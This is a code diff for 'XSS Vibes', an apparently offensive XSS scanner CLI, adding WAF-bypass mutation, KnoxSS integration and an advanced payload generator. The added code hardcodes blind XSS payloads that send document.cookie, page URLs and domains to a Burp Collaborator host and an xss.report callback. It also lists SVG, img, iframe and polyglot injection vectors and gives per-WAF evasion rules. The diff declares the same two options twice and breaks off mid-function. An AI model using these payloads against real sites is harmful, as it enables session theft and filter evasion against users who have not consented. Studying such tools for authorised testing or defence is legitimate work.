@@ -6,6 +6,7 @@ XSS Vibes CLI - Modern XSS Scanner with Click interface.
 import asyncio
 import logging
 import sys
+from datetime import datetime
 from pathlib import Path
 from typing import List, Optional
 
@@ -27,6 +28,12 @@ from .integrations import ParameterDiscovery, install_tools
 from .advanced_reporting import AdvancedReporter, ReportConfig
 from .payload_mutation import PayloadMutationEngine, InjectionContext, MutationType
 from .session_manager import SessionManager, LoginCredentials, SessionConfig, AuthMethod
+from .knoxss_integration import (
+    KnoxSSConfig,
+    knoxss_config_status,
+    generate_personalized_payloads,
+    knoxss_scan_target,
+)
 from .rate_limit import (
     RateLimiter,
     RateLimitConfig,
@@ -256,12 +263,62 @@ def cli(ctx, version):
     default="1",
     help="Encoding level: 1=basic, 2=advanced, 3=maximum evasion",
 )
+@click.option(
+    "--enhanced-payloads",
+    is_flag=True,
+    help="Enable enhanced payload database (2800+ payloads)",
+)
+@click.option(
+    "--payload-category",
+    type=click.Choice(
+        [
+            "basic_xss",
+            "advanced_evasion",
+            "waf_bypass",
+            "event_handlers",
+            "encoded_payloads",
+            "javascript_protocols",
+            "svg_based",
+            "iframe_based",
+            "dom_manipulation",
+            "polyglot",
+            "blind_xss",
+            "polyglot_xsspre",
+        ]
+    ),
+    help="Use specific enhanced payload category",
+)
 @click.option("--mutation", is_flag=True, help="Enable intelligent payload mutation")
 @click.option(
     "--mutation-generations",
     type=int,
     default=5,
     help="Number of mutation generations for genetic algorithm",
+)
+@click.option(
+    "--enhanced-payloads",
+    is_flag=True,
+    help="Use enhanced payload database (2800+ payloads)",
+)
+@click.option(
+    "--payload-category",
+    type=click.Choice(
+        [
+            "basic_xss",
+            "advanced_evasion",
+            "waf_bypass",
+            "event_handlers",
+            "encoded_payloads",
+            "javascript_protocols",
+            "svg_based",
+            "iframe_based",
+            "dom_manipulation",
+            "polyglot",
+            "blind_xss",
+            "polyglot_xsspre",
+        ]
+    ),
+    help="Enhanced payload category to use",
 )
 # Session management options
 @click.option("--login-url", help="Login URL for authenticated scanning")
@@ -332,6 +389,8 @@ def scan(
     callback_url,
     obfuscate,
     encoding_level,
+    enhanced_payloads,
+    payload_category,
     mutation,
     mutation_generations,
     # Session management parameters
@@ -490,6 +549,29 @@ def scan(
     payload_manager = PayloadManager()
     waf_detector = WAFDetector()
     scanner = XSSScanner(config, payload_manager, waf_detector)
+
+    # Display payload statistics
+    standard_count = payload_manager.payload_count
+    waf_count = payload_manager.waf_payload_count
+    enhanced_count = payload_manager.enhanced_payload_count
+
+    if enhanced_payloads:
+        click.echo(f"{Fore.CYAN}🧬 Enhanced Payloads Mode Enabled{Style.RESET_ALL}")
+        click.echo(f"📊 Loaded {enhanced_count} enhanced payloads")
+        if payload_category:
+            category_payloads = payload_manager.get_enhanced_payloads(
+                category=payload_category
+            )
+            click.echo(
+                f"🎯 Using category '{payload_category}': {len(category_payloads)} payloads"
+            )
+    else:
+        click.echo(
+            f"📊 Loaded {standard_count} standard + {waf_count} WAF-specific payloads"
+        )
+        click.echo(
+            f"💡 Use --enhanced-payloads for {enhanced_count} additional payloads"
+        )
 
     # Initialize parameter discovery if requested
     enhanced_targets = target_urls.copy()
@@ -768,7 +850,14 @@ def scan(
         for url in target_urls:
             click.echo(f"{Fore.BLUE}🔍 Scanning: {url}{Style.RESET_ALL}")
             result = scanner.scan_url_sync(
-                url, custom_headers, not no_waf_detect, custom_waf, waf_mode, target_waf
+                url,
+                custom_headers,
+                not no_waf_detect,
+                custom_waf,
+                waf_mode,
+                target_waf,
+                enhanced_payloads,
+                payload_category,
             )
             results.append(result)
 
@@ -1425,7 +1514,15 @@ def encoding_cmd(analyze, test_payload, list_encodings, demo):
 @click.option(
     "--context",
     type=click.Choice(
-        ["html_text", "html_attribute", "javascript_string", "url_parameter"]
+        [
+            "html_text",
+            "html_attribute",
+            "javascript_string",
+            "url_parameter",
+            "attr_double",
+            "attr_single",
+            "js_string",
+        ]
     ),
     default="html_text",
     help="Injection context",
@@ -1439,34 +1536,279 @@ def encoding_cmd(analyze, test_payload, list_encodings, demo):
 @click.option(
     "--variants", type=int, default=10, help="Number of mutation variants to generate"
 )
+@click.option(
+    "--waf",
+    type=click.Choice(
+        [
+            "cloudflare",
+            "akamai",
+            "imperva",
+            "f5",
+            "barracuda",
+            "sucuri",
+            "modsecurity",
+            "wordfence",
+            "aws-waf",
+        ]
+    ),
+    help="Target specific WAF for optimized mutations",
+)
+@click.option(
+    "--score-min",
+    type=float,
+    default=0.0,
+    help="Minimum confidence score for mutations (0.0-1.0)",
+)
+@click.option("--blind", is_flag=True, help="Generate blind XSS optimized payloads")
+@click.option(
+    "--colab",
+    is_flag=True,
+    help="Use Burp Collaborator server (817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com)",
+)
+@click.option(
+    "--blind-server",
+    type=click.Choice(["xss.report", "burp", "custom"]),
+    default="xss.report",
+    help="Blind XSS server: xss.report (default), burp (your collaborator), or custom",
+)
+@click.option(
+    "--custom-server",
+    help="Custom blind XSS server URL (when using --blind-server custom)",
+)
+@click.option("--cache-dir", help="Cache directory to avoid re-mutating same payloads")
 @click.option("--save", help="Save results to file")
-def mutation_cmd(payload, context, generations, population, variants, save):
-    """Intelligent payload mutation using genetic algorithms."""
+def mutation_cmd(
+    payload,
+    context,
+    generations,
+    population,
+    variants,
+    waf,
+    score_min,
+    blind,
+    colab,
+    blind_server,
+    custom_server,
+    cache_dir,
+    save,
+):
+    """Intelligent payload mutation using genetic algorithms with advanced WAF-aware optimization."""
+    import hashlib
+    import os
+    import json
+    from pathlib import Path
 
-    click.echo(f"{Fore.CYAN}🧬 Payload Mutation Engine{Style.RESET_ALL}\n")
+    click.echo(f"{Fore.CYAN}🧬 Advanced Payload Mutation Engine{Style.RESET_ALL}")
+
+    # Display configuration
+    if waf:
+        click.echo(f"{Fore.YELLOW}🛡️  WAF Target: {waf.upper()}{Style.RESET_ALL}")
+    if blind:
+        click.echo(f"{Fore.MAGENTA}👁️  Blind XSS Mode: Enabled{Style.RESET_ALL}")
+    if score_min > 0:
+        click.echo(f"{Fore.BLUE}⭐ Score Filter: ≥{score_min}{Style.RESET_ALL}")
+    if cache_dir:
+        click.echo(f"{Fore.GREEN}💾 Cache: {cache_dir}{Style.RESET_ALL}")
+    click.echo()
 
     try:
+        # Cache implementation
+        cache_file = None
+        if cache_dir:
+            cache_path = Path(cache_dir)
+            cache_path.mkdir(parents=True, exist_ok=True)
+
+            # Create cache key from payload + context + waf + blind
+            cache_key = hashlib.md5(
+                f"{payload}:{context}:{waf}:{blind}".encode()
+            ).hexdigest()
+            cache_file = cache_path / f"mutation_{cache_key}.json"
+
+            if cache_file.exists():
+                click.echo(
+                    f"{Fore.GREEN}📋 Loading cached mutations...{Style.RESET_ALL}"
+                )
+                with open(cache_file, "r") as f:
+                    cached_data = json.load(f)
+
+                # Filter by score if needed
+                cached_results = cached_data.get("variants", [])
+                if score_min > 0:
+                    cached_results = [
+                        r for r in cached_results if r["score"] >= score_min
+                    ]
+
+                if cached_results:
+                    click.echo(
+                        f"{Fore.GREEN}✅ Found {len(cached_results)} cached mutations{Style.RESET_ALL}"
+                    )
+
+                    for result in cached_results[:variants]:
+                        click.echo(
+                            f"{Fore.GREEN}Variant {result['variant']}:{Style.RESET_ALL}"
+                        )
+                        click.echo(f"  Payload: {result['payload']}")
+                        click.echo(f"  Score: {result['score']:.3f}")
+                        click.echo(f"  Mutations: {', '.join(result['mutations'])}")
+                        click.echo()
+
+                    if save:
+                        with open(save, "w") as f:
+                            json.dump(
+                                {
+                                    "original": payload,
+                                    "context": context,
+                                    "waf": waf,
+                                    "blind": blind,
+                                    "variants": cached_results[:variants],
+                                },
+                                f,
+                                indent=2,
+                            )
+                        click.echo(
+                            f"{Fore.GREEN}✅ Results saved to {save}{Style.RESET_ALL}"
+                        )
+
+                    return
+
         # Initialize mutation engine
         mutation_engine = PayloadMutationEngine()
 
-        # Convert context string to enum
+        # Enhanced context mapping with new contexts
         context_map = {
             "html_text": InjectionContext.HTML_CONTENT,
             "html_attribute": InjectionContext.HTML_ATTRIBUTE,
             "javascript_string": InjectionContext.JAVASCRIPT_STRING,
             "url_parameter": InjectionContext.URL_PARAMETER,
+            "attr_double": InjectionContext.HTML_ATTRIBUTE,
+            "attr_single": InjectionContext.HTML_ATTRIBUTE,
+            "js_string": InjectionContext.JAVASCRIPT_STRING,
         }
 
         injection_context = context_map.get(context, InjectionContext.HTML_CONTENT)
 
         click.echo(f"Original payload: {payload}")
         click.echo(f"Context: {context}")
-        click.echo(f"Generating {variants} variants...\n")
+
+        # Blind XSS payload optimization
+        if blind:
+            # Determine blind server
+            if colab:
+                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
+                click.echo(
+                    f"{Fore.BLUE}🔗 Using Burp Collaborator: {server_url}{Style.RESET_ALL}"
+                )
+            elif blind_server == "burp":
+                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
+                click.echo(
+                    f"{Fore.BLUE}🔗 Using Burp Collaborator: {server_url}{Style.RESET_ALL}"
+                )
+            elif blind_server == "custom" and custom_server:
+                server_url = custom_server
+                click.echo(
+                    f"{Fore.BLUE}🔗 Using Custom Server: {server_url}{Style.RESET_ALL}"
+                )
+            else:
+                server_url = "https://xss.report/c/terafos"
+                click.echo(
+                    f"{Fore.BLUE}🔗 Using XSS.Report: {server_url}{Style.RESET_ALL}"
+                )
+
+            # Auto-detect if payload already contains collaborator domain
+            if "oastify.com" in payload or "burpcollaborator" in payload.lower():
+                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
+                click.echo(
+                    f"{Fore.YELLOW}🔄 Auto-detected Collaborator domain in payload{Style.RESET_ALL}"
+                )
+
+            blind_payloads = [
+                f"<script>new Image().src='{server_url}?'+document.cookie</script>",
+                f"<img src=x onerror='new Image().src=\"{server_url}?c=\"+document.cookie'>",
+                f"<svg/onload='fetch(\"{server_url}?d=\"+document.domain)'>",
+                f"<iframe src='javascript:new Image().src=\"{server_url}?l=\"+location.href'></iframe>",
+                f"<body onload='navigator.sendBeacon(\"{server_url}\",document.cookie)'>",
+                f"<details ontoggle='new Image().src=\"{server_url}?dt=\"+document.title' open>",
+                f'<input onfocus=\'eval("new Image().src=\\"{server_url}?f=\\"+location.href")\' autofocus>',
+                f"<video><source onerror=\"new Image().src='{server_url}?v='+btoa(document.domain)\">",
+                f"<audio onerror=\"fetch('{server_url}?a='+encodeURIComponent(location.href))\">",
+            ]
+
+            # Replace alert/confirm with blind detection
+            if "alert" in payload or "confirm" in payload or "prompt" in payload:
+                import re
+
+                payload = re.sub(
+                    r"alert\([^)]*\)", f'new Image().src="{server_url}"', payload
+                )
+                payload = re.sub(
+                    r"confirm\([^)]*\)", f'new Image().src="{server_url}"', payload
+                )
+                payload = re.sub(
+                    r"prompt\([^)]*\)", f'new Image().src="{server_url}"', payload
+                )
+
+            click.echo(f"{Fore.MAGENTA}🔍 Blind XSS payload optimized{Style.RESET_ALL}")
+
+        # WAF-specific mutations
+        waf_optimizations = {}
+        if waf == "cloudflare":
+            waf_optimizations = {
+                "avoid_keywords": ["script", "javascript", "vbscript", "onclick"],
+                "prefer_encodings": ["html_entity", "url_encode"],
+                "bypass_patterns": ["/**/", "<!--", "-->"],
+            }
+        elif waf == "akamai":
+            waf_optimizations = {
+                "avoid_keywords": ["eval", "document", "window"],
+                "prefer_encodings": ["unicode", "hex"],
+                "bypass_patterns": ["\x00", "\x09", "\x0a"],
+            }
+        elif waf == "imperva":
+            waf_optimizations = {
+                "avoid_keywords": ["cookie", "location", "href"],
+                "prefer_encodings": ["base64", "unicode"],
+                "bypass_patterns": ["\\\\", "\\u", "\\x"],
+            }
+
+        click.echo(
+            f"Generating {variants} variants with {generations} generations...\n"
+        )
 
         # Generate mutations
         mutations = mutation_engine.mutate_payload(
             payload, injection_context, intensity=variants
         )
+
+        # Apply WAF-specific filtering and optimization
+        if waf and waf in ["cloudflare", "akamai", "imperva"]:
+            optimized_mutations = []
+            for mutation in mutations:
+                should_skip = False
+
+                # Check if payload contains avoided keywords
+                if "avoid_keywords" in waf_optimizations:
+                    for keyword in waf_optimizations["avoid_keywords"]:
+                        if keyword.lower() in mutation.mutated_payload.lower():
+                            mutation.confidence_score *= 0.7  # Reduce score
+
+                optimized_mutations.append(mutation)
+
+            mutations = optimized_mutations
+            click.echo(
+                f"{Fore.YELLOW}🛡️  Applied {waf.upper()} WAF optimizations{Style.RESET_ALL}"
+            )
+
+        # Filter by minimum score
+        if score_min > 0:
+            original_count = len(mutations)
+            mutations = [m for m in mutations if m.confidence_score >= score_min]
+            filtered_count = len(mutations)
+            click.echo(
+                f"{Fore.BLUE}⭐ Score filter: {original_count} → {filtered_count} mutations{Style.RESET_ALL}"
+            )
+
+        # Limit to requested variants
+        mutations = mutations[:variants]
 
         results = []
         for i, mutation in enumerate(mutations, 1):
@@ -1476,6 +1818,10 @@ def mutation_cmd(payload, context, generations, population, variants, save):
             click.echo(
                 f"  Mutations: {', '.join([m.value for m in mutation.mutations_applied])}"
             )
+            if waf:
+                click.echo(f"  WAF: Optimized for {waf.upper()}")
+            if blind:
+                click.echo(f"  Type: Blind XSS")
             click.echo()
 
             results.append(
@@ -1484,23 +1830,60 @@ def mutation_cmd(payload, context, generations, population, variants, save):
                     "payload": mutation.mutated_payload,
                     "score": mutation.confidence_score,
                     "mutations": [m.value for m in mutation.mutations_applied],
+                    "waf_optimized": waf is not None,
+                    "blind_xss": blind,
                 }
+            )
+
+        # Cache results
+        if cache_file:
+            cache_data = {
+                "original": payload,
+                "context": context,
+                "waf": waf,
+                "blind": blind,
+                "generated_at": str(Path().cwd()),
+                "variants": results,
+            }
+            with open(cache_file, "w") as f:
+                json.dump(cache_data, f, indent=2)
+            click.echo(
+                f"{Fore.GREEN}💾 Results cached to {cache_file}{Style.RESET_ALL}"
             )
 
         # Save results if requested
         if save:
-            import json
+            output_data = {
+                "original": payload,
+                "context": context,
+                "waf": waf,
+                "blind": blind,
+                "score_min": score_min,
+                "variants": results,
+            }
 
             with open(save, "w") as f:
-                json.dump(
-                    {"original": payload, "context": context, "variants": results},
-                    f,
-                    indent=2,
-                )
+                json.dump(output_data, f, indent=2)
             click.echo(f"{Fore.GREEN}✅ Results saved to {save}{Style.RESET_ALL}")
+
+        # Summary
+        click.echo(f"\n{Fore.CYAN}📊 Mutation Summary:{Style.RESET_ALL}")
+        click.echo(f"  Generated: {len(results)} variants")
+        if score_min > 0:
+            avg_score = (
+                sum(r["score"] for r in results) / len(results) if results else 0
+            )
+            click.echo(f"  Average Score: {avg_score:.3f}")
+        if waf:
+            click.echo(f"  WAF Optimized: {waf.upper()}")
+        if blind:
+            click.echo(f"  Blind XSS: Enabled")
 
     except Exception as e:
         click.echo(f"{Fore.RED}❌ Mutation failed: {e}{Style.RESET_ALL}")
+        import traceback
+
+        click.echo(f"{Fore.RED}Debug: {traceback.format_exc()}{Style.RESET_ALL}")
 
 
 @cli.command("session")
@@ -1565,6 +1948,504 @@ def session_cmd(login_url, username, password, auth_type, test_url, save_profile
     finally:
         if "session_manager" in locals():
             session_manager.close()
+
+
+@cli.command("pattern-list")
+@click.option(
+    "--type",
+    "pattern_type",
+    type=click.Choice(
+        [
+            "xss_detection",
+            "waf_bypass",
+            "context_injection",
+            "parameter_discovery",
+            "payload_selection",
+            "vulnerability_validation",
+        ]
+    ),
+    help="Filter patterns by type",
+)
+def pattern_list_cmd(pattern_type):
+    """List available XSS detection patterns."""
+    from .advanced_patterns import AdvancedPatternEngine
+
+    click.echo(f"{Fore.CYAN}🎯 XSS Vibes - Advanced Patterns{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    engine = AdvancedPatternEngine()
+    from .advanced_patterns import PatternType
+
+    ptype = PatternType(pattern_type) if pattern_type else None
+    patterns = engine.list_patterns(ptype)
+
+    click.echo(f"\n📋 Found {len(patterns)} patterns")
+
+    for pattern in patterns:
+        click.echo(f"\n{Fore.GREEN}• {pattern.name}{Style.RESET_ALL}")
+        click.echo(f"  Type: {pattern.pattern_type.value}")
+        click.echo(f"  Priority: {pattern.priority}")
+        click.echo(f"  WAF Targets: {', '.join(pattern.waf_targets)}")
+        click.echo(f"  Description: {pattern.description}")
+
+        if pattern.examples:
+            click.echo(
+                f"  Examples: {Fore.YELLOW}{', '.join(pattern.examples[:2])}{Style.RESET_ALL}"
+            )
+
+
+@cli.command("pattern-match")
+@click.option("--text", required=True, help="Text to match against patterns")
+@click.option(
+    "--type",
+    "pattern_type",
+    type=click.Choice(
+        [
+            "xss_detection",
+            "waf_bypass",
+            "context_injection",
+            "parameter_discovery",
+            "payload_selection",
+            "vulnerability_validation",
+        ]
+    ),
+    help="Filter by pattern type",
+)
+@click.option("--waf", help="Target WAF type")
+@click.option("--min-priority", type=int, default=0, help="Minimum pattern priority")
+def pattern_match_cmd(text, pattern_type, waf, min_priority):
+    """Match text against XSS patterns."""
+    from .advanced_patterns import AdvancedPatternEngine, PatternType
+
+    click.echo(f"{Fore.CYAN}🔍 Pattern Matching Analysis{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    engine = AdvancedPatternEngine()
+    ptype = PatternType(pattern_type) if pattern_type else None
+
+    matches = engine.match_patterns(
+        text, pattern_type=ptype, waf_target=waf, min_priority=min_priority
+    )
+
+    if matches:
+        click.echo(f"\n✅ Found {len(matches)} pattern matches:")
+
+        for match in matches:
+            click.echo(f"\n{Fore.GREEN}📍 {match['pattern_name']}{Style.RESET_ALL}")
+            click.echo(f"   Type: {match['pattern_type']}")
+            click.echo(f"   Priority: {match['priority']}")
+            click.echo(f"   Matches: {match['match_count']}")
+            click.echo(f"   WAF Targets: {', '.join(match['waf_targets'])}")
+            click.echo(f"   Description: {match['description']}")
+
+            if match["matches"]:
+                click.echo(
+                    f"   {Fore.YELLOW}Matched strings: {', '.join(str(m) for m in match['matches'][:3])}{Style.RESET_ALL}"
+                )
+    else:
+        click.echo(f"{Fore.YELLOW}⚠️  No patterns matched{Style.RESET_ALL}")
+
+
+@cli.command("pattern-suggest")
+@click.option("--response", required=True, help="Response text to analyze")
+@click.option("--context", help="Injection context hint")
+@click.option("--waf", help="Target WAF type")
+def pattern_suggest_cmd(response, context, waf):
+    """Suggest payloads based on response analysis."""
+    from .advanced_patterns import AdvancedPatternEngine
+
+    click.echo(f"{Fore.CYAN}💡 Payload Suggestions{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    engine = AdvancedPatternEngine()
+    suggestions = engine.suggest_payloads(response, context, waf)
+
+    if suggestions:
+        click.echo(f"\n📝 Suggested payload types ({len(suggestions)} suggestions):")
+        for suggestion in suggestions:
+            click.echo(f"  {Fore.GREEN}• {suggestion}{Style.RESET_ALL}")
+    else:
+        click.echo(f"{Fore.YELLOW}⚠️  No specific suggestions found{Style.RESET_ALL}")
+
+    # Also show reflection analysis
+    click.echo(f"\n{Fore.CYAN}🔍 Response Analysis:{Style.RESET_ALL}")
+    matches = engine.match_patterns(response)
+
+    if matches:
+        click.echo(f"  Detected patterns: {len(matches)}")
+        for match in matches[:3]:  # Show top 3
+            click.echo(
+                f"    • {match['pattern_name']} ({match['match_count']} matches)"
+            )
+    else:
+        click.echo("  No XSS patterns detected in response")
+
+
+@cli.command("pattern-analyze")
+@click.option("--payload", required=True, help="Payload to analyze")
+@click.option("--response", required=True, help="Response text")
+def pattern_analyze_cmd(payload, response):
+    """Analyze payload reflection in response."""
+    from .advanced_patterns import AdvancedPatternEngine
+
+    click.echo(f"{Fore.CYAN}🔬 Reflection Analysis{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    engine = AdvancedPatternEngine()
+    analysis = engine.analyze_reflection(payload, response)
+
+    click.echo(f"\n📋 Analysis Results:")
+    click.echo(f"  Payload: {Fore.YELLOW}{payload}{Style.RESET_ALL}")
+    click.echo(
+        f"  Reflected: {Fore.GREEN if analysis['reflected'] else Fore.RED}{analysis['reflected']}{Style.RESET_ALL}"
+    )
+    click.echo(f"  Reflection Count: {analysis['reflection_count']}")
+    click.echo(f"  Bypass Potential: {analysis['filter_bypass_potential']}/10")
+
+    if analysis["reflection_contexts"]:
+        click.echo(f"  Contexts: {', '.join(analysis['reflection_contexts'])}")
+
+    if analysis["encoding_detected"]:
+        click.echo(f"  Encoding: {', '.join(analysis['encoding_detected'])}")
+
+    if analysis["suggested_modifications"]:
+        click.echo(f"\n💡 Suggested modifications:")
+        for suggestion in analysis["suggested_modifications"]:
+            click.echo(f"    • {suggestion}")
+
+
+@cli.command("pattern-report")
+def pattern_report_cmd():
+    """Generate comprehensive pattern report."""
+    from .advanced_patterns import AdvancedPatternEngine
+
+    click.echo(f"{Fore.CYAN}📊 Pattern System Report{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    engine = AdvancedPatternEngine()
+    report = engine.generate_pattern_report()
+
+    click.echo(f"\n📈 Statistics:")
+    click.echo(f"  Total Patterns: {report['total_patterns']}")
+    click.echo(f"  Active Patterns: {report['active_patterns']}")
+
+    click.echo(f"\n🎯 Pattern Types:")
+    for ptype, count in report["pattern_types"].items():
+        click.echo(f"  {ptype}: {count} patterns")
+
+    click.echo(f"\n🛡️  WAF Coverage:")
+    for waf, count in sorted(report["waf_coverage"].items()):
+        click.echo(f"  {waf}: {count} patterns")
+
+    click.echo(f"\n⭐ Priority Distribution:")
+    for priority, count in sorted(
+        report["priority_distribution"].items(), reverse=True
+    ):
+        click.echo(f"  Priority {priority}: {count} patterns")
+
+
+@cli.command("knoxss-config")
+def knoxss_config_command():
+    """Check KnoxSS Pro API configuration status."""
+    from .knoxss_integration import knoxss_config_status
+
+    click.echo(f"{Fore.BLUE}🔐 KnoxSS Pro Configuration{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    knoxss_config_status()
+
+
+@cli.command("knoxss-payloads")
+def knoxss_payloads_command():
+    """Generate personalized KnoxSS Blind XSS payloads."""
+    from .knoxss_integration import generate_personalized_payloads
+
+    click.echo(f"{Fore.BLUE}🧬 KnoxSS Personal Payloads{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    generate_personalized_payloads()
+
+
+@cli.command("knoxss-scan")
+@click.argument("url")
+@click.option("--post-data", help="POST data for the request")
+@click.option("--auth", help="Authentication (e.g., Cookie:PHPSESSID=abc)")
+@click.option("--afb", is_flag=True, help="Enable AFB (Anti-Filter Bypass) mode")
+@click.option(
+    "--flash", is_flag=True, help="Flash mode (URL must contain [XSS] marker)"
+)
+@click.option("--poc", help="Submit PoC feedback for improvement")
+@click.option("--checkpoc", is_flag=True, help="Validate PoC feature")
+def knoxss_scan_command(url, post_data, auth, afb, flash, poc, checkpoc):
+    """Scan URL using KnoxSS Pro API."""
+    import asyncio
+    from .knoxss_integration import knoxss_scan_target
+
+    click.echo(f"{Fore.BLUE}🔍 KnoxSS Pro API Scanner{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    kwargs = {}
+    if post_data:
+        kwargs["post_data"] = post_data
+    if auth:
+        kwargs["auth"] = auth
+    if afb:
+        kwargs["afb"] = True
+    if poc:
+        kwargs["poc"] = poc
+    if checkpoc:
+        kwargs["checkpoc"] = True
+
+    if flash and "[XSS]" not in url:
+        click.echo(
+            f"{Fore.YELLOW}⚠️  Flash mode requires [XSS] marker in URL{Style.RESET_ALL}"
+        )
+        return
+
+    try:
+        result = asyncio.run(knoxss_scan_target(url, **kwargs))
+
+        if result and result.xss_found:
+            click.echo(
+                f"\n{Fore.GREEN}🎉 XSS vulnerability confirmed by KnoxSS Pro!{Style.RESET_ALL}"
+            )
+        elif result:
+            click.echo(f"\n{Fore.BLUE}✅ Target appears clean{Style.RESET_ALL}")
+        else:
+            click.echo(f"\n{Fore.RED}❌ Scan failed{Style.RESET_ALL}")
+
+    except Exception as e:
+        click.echo(f"{Fore.RED}❌ KnoxSS scan error: {e}{Style.RESET_ALL}")
+
+
+@cli.command("knoxss-mass")
+@click.argument("file_path")
+@click.option("--delay", default=1.0, help="Delay between requests (seconds)")
+def knoxss_mass_command(file_path, delay):
+    """Mass scan URLs from file using KnoxSS Pro API."""
+    import asyncio
+    from .knoxss_integration import knoxss_mass_scan
+
+    click.echo(f"{Fore.BLUE}📊 KnoxSS Mass Scanner{Style.RESET_ALL}")
+    click.echo("=" * 50)
+
+    try:
+        results = asyncio.run(knoxss_mass_scan(file_path, delay))
+
+        if results:
+            found_count = sum(1 for r in results if r.xss_found)
+            click.echo(f"\n{Fore.GREEN}📈 Mass scan completed:{Style.RESET_ALL}")
+            click.echo(f"   Total scanned: {len(results)}")
+            click.echo(f"   XSS found: {found_count}")
+            click.echo(f"   Clean: {len(results) - found_count}")
+
+    except Exception as e:
+        click.echo(f"{Fore.RED}❌ Mass scan error: {e}{Style.RESET_ALL}")
+
+
+@cli.command("advanced-payload")
+@click.option(
+    "--type",
+    "payload_type",
+    type=click.Choice(["svg", "img", "iframe", "body", "data-uri", "polyglot", "all"]),
+    default="all",
+    help="Type of advanced payload to generate",
+)
+@click.option(
+    "--context",
+    type=click.Choice(
+        ["html_text", "attr_double", "attr_single", "js_string", "url_param"]
+    ),
+    default="html_text",
+    help="Injection context for payload adaptation",
+)
+@click.option(
+    "--blind-server",
+    default="https://xss.report/c/terafos",
+    help="Blind XSS callback server",
+)
+@click.option(
+    "--colab",
+    is_flag=True,
+    help="Use Burp Collaborator (817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com)",
+)
+@click.option(
+    "--variants", type=int, default=10, help="Number of variants per payload type"
+)
+@click.option("--save", help="Save results to file")
+def advanced_payload_cmd(payload_type, context, blind_server, colab, variants, save):
+    """Generate advanced XSS payloads beyond basic <script> tags (robota feature #2)."""
+
+    # Determine blind server
+    if colab:
+        blind_server = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
+
+    click.echo(f"{Fore.CYAN}🚀 Advanced Payload Generator{Style.RESET_ALL}")
+    click.echo(f"{Fore.BLUE}📋 Type: {payload_type.upper()}{Style.RESET_ALL}")
+    click.echo(f"{Fore.BLUE}🎯 Context: {context}{Style.RESET_ALL}")
+    click.echo(f"{Fore.MAGENTA}🔗 Blind Server: {blind_server}{Style.RESET_ALL}")
+    if colab:
+        click.echo(f"{Fore.YELLOW}🤝 Using Burp Collaborator{Style.RESET_ALL}")
+    click.echo()
+
+    try:
+        # Advanced payload templates
+        payload_templates = {
+            "svg": [
+                "<svg/onload=alert(1)>",
+                "<svg onload=alert(1)>",
+                "<svg/onload='alert(1)'>",
+                '<svg onload="alert(1)">',
+                "<svg><animateTransform onbegin=alert(1)>",
+                "<svg><set onbegin=alert(1)>",
+                "<svg><animate onbegin=alert(1)>",
+                "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+            ],
+            "img": [
+                "<img src=x onerror=alert(1)>",
+                "<img src='x' onerror='alert(1)'>",
+                '<img src="x" onerror="alert(1)">',
+                "<img/src=x/onerror=alert(1)>",
+                "<img src onerror=alert(1)>",
+                "<img src=# onerror=alert(1)>",
+                "<img src=x onLoad=alert(1)>",
+                "<img src=x onmouseover=alert(1)>",
+            ],
+            "iframe": [
+                '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+                '<iframe src="javascript:alert(1)"></iframe>',
+                "<iframe src=javascript:alert(1)></iframe>",
+                "<iframe onload=alert(1)></iframe>",
+                "<iframe/onload=alert(1)></iframe>",
+                '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
+            ],
+            "body": [
+                "<body onload=alert(1)>",
+                "<body/onload=alert(1)>",
+                "<body onload='alert(1)'>",
+                '<body onload="alert(1)">',
+                "<body onpageshow=alert(1)>",
+                "<body onhashchange=alert(1)>",
+                "<body onfocus=alert(1)>",
+            ],
+            "data-uri": [
+                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+                "data:text/html,<script>alert(1)</script>",
+                "data:text/html;charset=utf-8,<script>alert(1)</script>",
+                "data:text/javascript,alert(1)",
+                "data:application/javascript,alert(1)",
+                "data:image/svg+xml,<svg/onload=alert(1)>",
+            ],
+            "polyglot": [
+                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+                "'\"><img src=x onerror=alert(1)>",
+                '";alert(1);//',
+                "</script><svg/onload=alert(1)>",
+                "'-alert(1)-'",
+                '"-alert(1)-"',
+            ],
+        }
+
+        def adapt_to_context(payload, ctx):
+            """Adapt payload to specific injection context."""
+            if ctx == "attr_double":
+                return (
+                    payload.replace('"', "&quot;")
+                    .replace("<", "&lt;")
+                    .replace(">", "&gt;")
+                )
+            elif ctx == "attr_single":
+                return (
+                    payload.replace("'", "&#39;")
+                    .replace("<", "&lt;")
+                    .replace(">", "&gt;")
+                )
+            elif ctx == "js_string":
+                return (
+                    payload.replace("<", "\\u003C")
+                    .replace(">", "\\u003E")
+                    .replace('"', '\\"')
+                )
+            elif ctx == "url_param":
+                import urllib.parse
+
+                return urllib.parse.quote(payload)
+            return payload
+
+        def make_blind(payload, server):
+            """Convert payload to blind XSS."""
+            blind_callback = f"new Image().src='{server}'"
+            return payload.replace("alert(1)", blind_callback)
+
+        results = []
+
+        if payload_type == "all":
+            types_to_generate = ["svg", "img", "iframe", "body", "data-uri", "polyglot"]
+        else:
+            types_to_generate = [payload_type]
+
+        for ptype in types_to_generate:
+            click.echo(f"{Fore.GREEN}=== {ptype.upper()} VECTORS ==={Style.RESET_ALL}")
+
+            templates = payload_templates.get(ptype, [])
+            count = 0
+
+            for template in templates[:variants]:
+                count += 1
+
+                # Make blind XSS version
+                blind_payload = make_blind(template, blind_server)
+
+                # Adapt to context
